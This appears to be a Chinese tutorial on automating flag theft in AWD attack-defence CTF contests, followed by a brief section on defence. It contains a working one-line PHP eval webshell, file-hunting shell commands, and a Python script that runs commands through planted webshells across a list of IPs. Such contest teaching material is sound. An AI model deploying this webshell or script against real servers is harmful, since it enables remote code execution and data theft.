# AWD比赛：P1：让flag自己送上门来

在本节课中，我们将学习在AWD（Attack With Defense）攻防赛中一种高效的得分策略：如何自动化地获取对手服务器的flag，即“让flag自己送上门来”。我们将重点讲解利用Webshell进行批量、自动化的flag提交。

## 概述

AWD比赛中，防守己方服务与攻击对手服务同样重要。攻击的核心目标之一是获取对手服务器上的flag。手动攻击效率低下，因此需要自动化脚本。本节将介绍如何利用已获取的Webshell，编写脚本自动从对手服务器上读取并提交flag。

上一节我们介绍了AWD比赛的基本模式，本节中我们来看看如何实现攻击自动化。

## 核心原理与步骤

自动化获取flag的过程通常分为三个步骤：首先是利用漏洞获取Webshell，其次是遍历服务器目录寻找flag文件，最后是将找到的flag自动提交到比赛平台。

以下是实现自动化攻击的具体步骤：

1.  **获取Webshell**
    通过比赛前期发现的漏洞（如文件上传、命令注入等），在目标服务器上植入一个Webshell。Webshell是一个可供远程执行命令的网页脚本，通常用PHP、Python等语言编写。例如，一个简单的PHP Webshell代码如下：
    ```php
    <?php @eval($_POST[‘cmd’]);?>
    ```
    通过向该脚本发送POST请求，并在`cmd`参数中传递系统命令，即可在目标服务器上执行命令。

2.  **寻找flag文件**
    比赛中的flag通常存放在固定的文件或目录中，例如`/flag`、`/flag.txt`或`/home/ctf/flag`。我们需要通过Webshell执行命令来读取这些文件。可以使用`find`、`cat`等命令。
    ```
    find / -name “*flag*” 2>/dev/null
    cat /flag
    ```

3.  **自动化提交flag**
    找到flag后，需要将其提交到比赛平台的指定接口以获得分数。这通常是一个带认证的HTTP POST请求。我们可以编写一个脚本，循环遍历所有对手IP，通过其Webshell执行命令获取flag，然后自动提交。

## 编写自动化脚本

理解了核心步骤后，我们来编写一个简单的Python自动化脚本。该脚本将模拟攻击者行为，实现批量获取与提交flag。

以下是脚本的关键部分：

```python
import requests
import time

# 配置信息
target_ips = [‘192.168.1.101‘, ‘192.168.1.102‘] # 对手服务器IP列表
webshell_path = ‘/shell.php‘ # 假设Webshell路径
submit_url = ‘http://比赛平台地址/submit‘ # 提交flag的接口
team_token = ‘your_team_token‘ # 队伍令牌

for ip in target_ips:
    try:
        # 1. 通过Webshell执行命令，读取flag
        webshell_url = f‘http://{ip}{webshell_path}‘
        data = {‘cmd‘: ‘cat /flag‘}
        resp = requests.post(webshell_url, data=data, timeout=3)
        flag = resp.text.strip()

        if flag and len(flag) == 32: # 假设flag是32位MD5值
            # 2. 提交flag到平台
            submit_data = {
                ‘token‘: team_token,
                ‘flag‘: flag
            }
            result = requests.post(submit_url, data=submit_data)
            print(f‘[+] 成功提交 {ip} 的flag: {flag}‘)
        else:
            print(f‘[-] 未在 {ip} 找到有效flag‘)
    except Exception as e:
        print(f‘[!] 处理 {ip} 时出错: {e}‘)
    time.sleep(1) # 避免请求过于频繁
```

## 注意事项与防御

在实施自动化攻击的同时，也必须防范对手使用相同的策略。因此，防守方需要及时修补漏洞、清理Webshell、监控异常流量。

以下是防守方可以采取的措施列表：

*   **及时修补漏洞**：比赛开始后，第一时间分析己方代码，修复已知漏洞。
*   **文件监控与清理**：使用脚本监控Web目录文件变化，发现可疑文件立即删除。
*   **系统命令监控**：监控`/tmp`、`/dev/shm`等目录以及`ps aux`命令，查找可疑进程。
*   **网络流量监控**：使用`tcpdump`或`iptables`日志分析异常外连或高频请求。

## 总结

本节课中我们一起学习了在AWD比赛中实现自动化攻击的核心方法。我们首先了解了通过Webshell控制目标服务器的原理，然后学习了编写Python脚本来自动化执行命令、获取flag并提交到评分平台的过程。同时，我们也简要探讨了作为防守方应采取的相应措施。掌握这套“攻防一体”的思路，将能帮助你在AWD比赛中更高效地得分和防守。